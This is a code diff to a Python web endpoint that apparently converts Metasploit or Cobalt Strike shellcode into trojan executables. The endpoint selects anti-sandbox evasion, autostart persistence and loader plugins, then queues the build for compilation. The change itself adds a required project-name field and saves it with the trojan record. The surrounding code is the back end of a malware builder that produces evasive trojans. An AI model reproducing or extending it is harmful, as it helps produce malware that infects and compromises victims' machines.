@@ -174,6 +174,7 @@ def GetAutoStart(request):#获取反沙箱方式
 """shellcode_to_trojan
 {
 	"token": "xxx",
+	"shellcode_name": "xxxx",
 	"shellcode_type": "1",
 	"shellcode_architecture": "x64",
 	"plugin":"Cpp_EXE_Windows_Null_Yes_CreateThreatPoolWait_20210908.py",
@@ -189,6 +190,7 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
     if request.method == "POST":
         try:
             Token=json.loads(request.body)["token"]
+            ShellcodeName = json.loads(request.body)["shellcode_name"]  # 项目名字
             Shellcode = json.loads(request.body)["shellcode"]#shellcode字符串
             ShellcodeType = json.loads(request.body)["shellcode_type"] #用来辨别MSF 还是CS
             ShellcodeArchitecture = json.loads(request.body)["shellcode_architecture"]  # 架构类型 X86或者X64
@@ -201,6 +203,8 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
                 TrojanModulesFilePath=GetTrojanModulesFilePath().Result()#获取插件文件夹
                 PluginList = os.listdir(TrojanModulesFilePath)#获取文件夹中全部文件
                 try:
+                    if ShellcodeName=="":#判断是否有名字
+                        return JsonResponse({'message': "未传入项目名称！", 'code': 410, })
                     if not (set(AutoStartFunction) < set(AutoStart().__Method__)):#判断是否是子集，如果是c
                         return JsonResponse({'message': "传入自启函数并不在可调用列表中ლ(•̀ _ •́ ლ)", 'code': 402, })
                     elif not (set(AntiSandboxFunction) < set(AntiSandbox().__Method__)):
@@ -276,7 +280,7 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
 
                                         CompleteCommand=Command + VirusFileGenerationPath +" "+VirusOriginalFilePath #进行命令拼接
                                         RedisCompileCodeTask=CompileCode.delay(CompleteCommand)
-                                        TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,
+                                        TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,shellcode_name=ShellcodeName,
                                                                trojan_original_file_name=RandomName + ScriptModule.__language__,
                                                                trojan_generate_file_name=RandomName + ScriptModule.__process__, compilation_status="0",
                                                                redis_id=RedisCompileCodeTask.task_id,
